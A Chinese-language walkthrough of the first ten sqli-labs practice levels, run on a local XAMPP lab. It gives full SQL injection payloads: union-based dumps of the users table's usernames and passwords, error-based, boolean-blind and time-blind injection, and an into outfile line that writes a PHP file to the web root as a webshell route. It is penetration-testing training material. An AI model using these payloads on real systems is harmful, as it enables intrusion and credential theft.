# sqli-labs 前 10 关详解（注入从这里毕业）

> 环境：XAMPP + sqli-labs（GitHub 搜 Audi-1/sqli-labs），导入后访问 http://127.0.0.1/sqli-labs/
> 只打自己的靶场。`--+` 是注释符（等价 `-- `）。

## 每关通用流程（背下来）

**试闭合 → order by 猜列数 → union 找显示位 → 拖库**

## Less-1：GET 字符型（入门关）

闭合方式：`'`。完整链路：

```
?id=1'                          → 报错，确认注入
?id=1' order by 3--+            → 正常；4 报错 → 3 列
?id=-1' union select 1,2,3--+   → 显示位是 2、3
?id=-1' union select 1,database(),3--+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

## Less-2：GET 数字型

和 Less-1 的区别：**参数是数字，不用引号闭合**。`?id=1 order by 3--+` 直接开始。识别方法：`?id=1'` 报错而 `?id=1 and 1=1` 正常 = 数字型。

## Less-3：字符型 + 括号

闭合方式：`')`。所以每个 payload 结尾用 `')` 开头部分补上：`?id=1') order by 3--+`。
识别方法：`?id=1'` 报错后看报错信息里的括号提示，或试 `?id=1')--+` 是否正常。

## Less-4：双引号 + 括号

闭合方式：`")`。`?id=1") union select 1,2,3--+`。
**前 4 关的目的：让你明白"闭合"两个字——每种闭合方式，就是一条新题。**

## Less-5 / Less-6：报错注入

页面不显示数据，但会**显示 SQL 报错**。用报错函数把数据"挤"进报错信息：

```
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```
Less-6 和 Less-5 一样，只是闭合从 `'` 变 `"`。

## Less-7：导出文件（概念关）

`into outfile` 把查询结果写成文件（需要数据库有写权限）：
```
?id=1')) union select 1,2,'<?php phpinfo();?>' into outfile '/var/www/html/x.php'--+
```
写不进去很正常（权限限制），**重点是搞懂原理**：能写文件 = 能拿 webshell。

## Less-8：布尔盲注

页面只有"正常/异常"两种状态，没有数据、没有报错。用真假判断逐字符猜：

```
?id=1' and length(database())=8--+          → 正常 = 库名 8 位
?id=1' and substr(database(),1,1)='s'--+    → 正常 = 第一个字符是 s
```

## Less-9 / Less-10：时间盲注

连真假变化都没有。用 sleep 把"真"变成"慢"：

```
?id=1' and if(length(database())=8,sleep(5),1)--+   → 页面 5 秒才回 = 判断成立
```
Less-10 是双引号闭合。

## 通关标准

- 前 4 关：能手注完整拖出 users 表（不查笔记）
- 5–6 关：理解"报错是信息通道"
- 8–9 关：理解盲注思路，能说出为什么"慢"
- 全程：每关记下**闭合方式**，10 关做完你就有了一张"闭合方式对照表"

做完前 10 关，[SQL注入进阶手册.md](15_SQL注入进阶手册.md) 里的每一步你都亲手走过了。
